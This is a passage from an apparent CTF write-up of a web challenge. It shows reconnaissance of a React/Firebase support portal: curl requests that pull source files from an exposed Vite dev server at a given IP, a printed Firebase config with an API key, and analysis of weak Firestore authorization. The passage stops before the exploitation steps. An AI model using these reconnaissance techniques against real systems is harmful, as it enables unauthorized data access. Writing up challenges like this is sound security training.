# MalaysiaU Support Portal - Complete CTF Writeup

**Challenge Name:** MalaysiaU Support Portal  
**Challenge Type:** Web Application + Linux Privilege Escalation  
**Difficulty:** Medium  
**Date Completed:** November 28, 2025  
**Flags Captured:** 3/3 ✅  
**Total Time:** ~1 hour 35 minutes

---

## Table of Contents

1. [Challenge Overview](#challenge-overview)
2. [Reconnaissance Phase](#reconnaissance-phase)
3. [Flag 1: Firebase Misconfiguration](#flag-1-firebase-misconfiguration)
4. [Flag 2: SSH Access via Leaked Credentials](#flag-2-ssh-access-via-leaked-credentials)
5. [Flag 3: Privilege Escalation via Path Traversal](#flag-3-privilege-escalation-via-path-traversal)
6. [Complete Attack Chain](#complete-attack-chain)
7. [Lessons Learned](#lessons-learned)
8. [Remediation Recommendations](#remediation-recommendations)
9. [Conclusion](#conclusion)

---

## Challenge Overview

### Target Information
```
URL:         http://118.107.233.236:3005/
Application: MalaysiaU Support Portal
Type:        Student Support & Ticketing System
Technology:  React + Firebase + Vite
Objective:   Capture 3 flags through web penetration testing
Constraints: Manual testing only, no automated tools
Deadline:    Sunday, November 30, 2025, 1:00 AM
```

### Initial Assessment

Upon accessing the target URL, I was presented with a modern single-page application (SPA) built with React. The application appeared to be a support ticketing system for "MalaysiaU" (Malaysia University) students.

**First Impressions:**
- Clean, professional interface
- Login/Sign-up functionality
- Mentions "Student Support & Ticketing System"
- Modern web stack (React-based)

---

## Reconnaissance Phase

### Step 1: Technology Fingerprinting

**Command:**
```bash
curl -I http://118.107.233.236:3005/
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 358
Date: Thu, 28 Nov 2025 14:30:15 GMT
Server: Vite
```

**🚨 Critical Finding:** Server header reveals **Vite** - a modern frontend build tool often used in development mode.

### Step 2: Testing for Vite Development Mode

Vite development servers expose source files directly. Testing common paths:

**Command:**
```bash
curl http://118.107.233.236:3005/src/App.jsx
```

**Result:** ✅ **SUCCESS!** Complete source code returned.

**Testing additional files:**
```bash
curl http://118.107.233.236:3005/src/firebase-config.js
curl http://118.107.233.236:3005/src/pages/Login.jsx
curl http://118.107.233.236:3005/src/pages/Dashboard.jsx
curl http://118.107.233.236:3005/src/pages/Chat.jsx
curl http://118.107.233.236:3005/src/components/ChatMessage.jsx
curl http://118.107.233.236:3005/src/main.jsx
curl http://118.107.233.236:3005/package.json
```

**Result:** All files accessible! Complete source code disclosure vulnerability.

### Step 3: Analyzing Firebase Configuration

**File:** `http://118.107.233.236:3005/src/firebase-config.js`

**Retrieved Content:**
```javascript
// Import the functions you need from the SDKs you need
import { initializeApp } from "firebase/app";
import { getAnalytics } from "firebase/analytics";
import { getAuth } from "firebase/auth";
import { getFirestore } from "firebase/firestore";

// Your web app's Firebase configuration
const firebaseConfig = {
  apiKey: "AIzaSyBnFHdbXaNzsVX1If83sBv0o-g48fNGD94",
  authDomain: "supportchat-897c5.firebaseapp.com",
  projectId: "supportchat-897c5",
  storageBucket: "supportchat-897c5.firebasestorage.app",
  messagingSenderId: "640862952306",
  appId: "1:640862952306:web:10d25b3a6b2765b90b1beb",
  measurementId: "G-65VJHQJHL4"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);

// Initialize Firebase services
const auth = getAuth(app);
const db = getFirestore(app);

export { app, analytics, auth, db };
```

**🔥 Critical Information Extracted:**
- **Project ID:** `supportchat-897c5`
- **API Key:** `AIzaSyBnFHdbXaNzsVX1If83sBv0o-g48fNGD94`
- **Auth Domain:** `supportchat-897c5.firebaseapp.com`
- **Database:** Firestore
- **Authentication:** Firebase Auth

### Step 4: Analyzing Application Structure

**File:** `http://118.107.233.236:3005/src/App.jsx`

**Key Routes Identified:**
```javascript
<Routes>
  <Route path="/login" element={<Login />} />
  <Route path="/dashboard" element={<Dashboard />} />
  <Route path="/chat/:ticketId" element={<Chat />} />
</Routes>
```

**Authentication Logic:**
```javascript
// User state management
const [user, setUser] = useState(null);

// Authentication listener
useEffect(() => {
  const unsubscribe = onAuthStateChanged(auth, (currentUser) => {
    setUser(currentUser);
    setLoading(false);
  });
  return () => unsubscribe();
}, []);

// Protected route logic
{user ? <Dashboard /> : <Navigate to="/login" />}
```

**Observations:**
- Client-side only route protection
- Firebase Authentication integration
- No server-side validation visible

### Step 5: Analyzing Dashboard Component

**File:** `http://118.107.233.236:3005/src/pages/Dashboard.jsx`

**Critical Code Section:**
```javascript
const loadTickets = async () => {
  try {
    // Query only tickets belonging to current user
    const ticketsRef = collection(db, 'support_tickets');
    const q = query(
      ticketsRef,
      where('user_id', '==', auth.currentUser.email)
    );
    const querySnapshot = await getDocs(q);
    
    const ticketsList = [];
    querySnapshot.forEach((doc) => {
      ticketsList.push({ id: doc.id, ...doc.data() });
    });
    
    setTickets(ticketsList);
  } catch (error) {
    console.error('Error loading tickets:', error);
  }
};
```

**Firestore Data Structure Discovered:**
```javascript
{
  user_id: "user@email.com",
  subject: "Ticket subject",
  status: "open" | "closed",
  created_at: "YYYY-MM-DD",
  internal: true | false  // 🔒 INTERNAL TICKET FLAG!
}
```

**🚨 Key Finding:** There's an `internal` flag field that marks administrative/privileged tickets!

**UI Code for Internal Badge:**
```javascript
{ticket.internal && <span style={styles.internalBadge}> 🔒 INTERNAL</span>}
```

### Step 6: Analyzing Chat Message Component

**File:** `http://118.107.233.236:3005/src/components/ChatMessage.jsx`

**Sensitive Content Detection Logic:**
```javascript
const isSensitive = message.content.includes('MCC2025{') || 
                    message.content.toLowerCase().includes('password') ||
                    message.content.toLowerCase().includes('ssh');
```

**🎯 FLAG FORMAT DISCOVERED:** `MCC2025{...}`

**Message Role System:**
```javascript
const isSupport = message.sender_role === 'support';
const isAdmin = message.sender_role === 'admin';
const isStudent = message.sender_role === 'student';
```

**Visual Indicators:**
- 👑 Admin messages (orange background)
- 🛠️ Support messages (blue background)
- 👤 Student messages (green background)
- ⚠️ Sensitive content warning (yellow highlight)

**Message Structure:**
```javascript
{
  sender: "email@example.com",
  sender_role: "student" | "support" | "admin",
  content: "Message text",
  timestamp: "ISO 8601 datetime"
}
```

### Step 7: Analyzing Chat Component

**File:** `http://118.107.233.236:3005/src/pages/Chat.jsx`

**Message Loading Logic:**
```javascript
const loadTicketAndMessages = async () => {
  try {
    // Load messages from subcollection
    const messagesRef = collection(db, 'support_tickets', ticketId, 'messages');
    const q = query(messagesRef, orderBy('timestamp', 'asc'));
    const querySnapshot = await getDocs(q);
    
    const messagesList = [];
    querySnapshot.forEach((doc) => {
      messagesList.push({ id: doc.id, ...doc.data() });
    });
    
    setMessages(messagesList);
  } catch (error) {
    console.error('Error loading messages:', error);
  }
};
```

**Firestore Collection Structure:**
```
support_tickets (collection)
  └─ {ticketId} (document)
      ├─ user_id
      ├─ subject
      ├─ status
      ├─ created_at
      ├─ internal
      └─ messages (subcollection)
          └─ {messageId} (document)
              ├─ sender
              ├─ sender_role
              ├─ content
              └─ timestamp
```

**🚨 Security Concern:** No authorization check in the code - relies entirely on Firestore security rules.

### Step 8: Analyzing Login Component

**File:** `http://118.107.233.236:3005/src/pages/Login.jsx`

**Authentication Methods:**
```javascript
const handleSubmit = async (e) => {
  e.preventDefault();
  setError('');
  
  try {
    if (isSignUp) {
      await createUserWithEmailAndPassword(auth, email, password);
    } else {
      await signInWithEmailAndPassword(auth, email, password);
    }
    navigate('/dashboard');
  } catch (err) {
    setError(err.message);
  }
};
```

**Key Observations:**
- ✅ Sign-up functionality is **OPEN** - anyone can create accounts
- ✅ No CAPTCHA or rate limiting visible
- ✅ Email format suggested: `student@malaysiauniv.edu.my`

### Step 9: Package Analysis

**File:** `http://118.107.233.236:3005/package.json`
```json
{
  "name": "malaysiauniv-support-frontend",
  "private": true,
  "version": "1.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  },
  "dependencies": {
    "react": "^18.2.0",
    "react-dom": "^18.2.0",
    "react-router-dom": "^6.20.0",
    "firebase": "^10.7.1"
  },
  "devDependencies": {
    "@types/react": "^18.2.43",
    "@types/react-dom": "^18.2.17",
    "@vitejs/plugin-react": "^4.2.1",
    "vite": "^5.0.8"
  }
}
```

**Technology Stack Confirmed:**
- React 18.2.0
- React Router DOM 6.20.0
- Firebase 10.7.1
- Vite 5.0.8

---

## Flag 1: Firebase Misconfiguration

### Vulnerability Analysis

**Issue:** Firestore security rules are misconfigured, allowing unauthorized read access to all documents.

**Root Cause:** The client-side code filters tickets by `user_id`, but this filtering happens AFTER data retrieval. If Firestore security rules are not properly configured, an attacker can bypass client-side filtering by querying the database directly.

### Exploitation Process

#### Step
